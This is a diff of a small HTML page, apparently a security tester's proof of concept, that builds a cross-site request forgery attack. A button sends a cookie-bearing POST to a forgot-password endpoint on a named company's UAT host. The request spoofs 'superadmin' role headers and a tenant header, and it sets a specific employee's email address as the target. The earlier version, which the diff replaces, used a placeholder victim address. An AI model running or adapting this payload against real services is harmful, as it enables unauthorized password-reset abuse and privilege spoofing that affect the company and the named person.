@@ -1,16 +1,42 @@
-<h1>CSRF Demo</h1>
-<button id="attack">Send CSRF Request</button>
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CSRF Demo</title>
+</head>
+<body>
+
+<h2>CSRF Attack Demo</h2>
+
+<button onclick="attack()">Trigger CSRF Attack</button>
+
+<pre id="output"></pre>
+
 <script>
-document.getElementById("attack").onclick = function() {
-  fetch("https://grow-uat.fareye.co/api/tenant/merchants/forgot-password", {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json",
-      "role": "superadmin",
-      "tenant": "cpdirect"
-    },
-    body: JSON.stringify({ email: "victim@example.com" }),
-    credentials: "include"
-  }).then(res => res.text()).then(console.log);
-};
+async function attack() {
+  try {
+    const res = await fetch("https://grow-uat.fareye.co/api/tenant/merchants/forgot-password", {
+      method: "POST",
+      credentials: "include", // tries to send cookies
+      headers: {
+        "Content-Type": "application/json",
+        "role": "superadmin",
+        "tenant": "couriersplease",
+        "userType": "superadmin"
+      },
+      body: JSON.stringify({
+        email: "anandita.sharma@getfareye.com"
+      })
+    });
+
+    const text = await res.text();
+    document.getElementById("output").innerText =
+      "Status: " + res.status + "\n\nResponse:\n" + text;
+
+  } catch (err) {
+    document.getElementById("output").innerText = "Error:\n" + err;
+  }
+}
 </script>
+
+</body>
+</html>
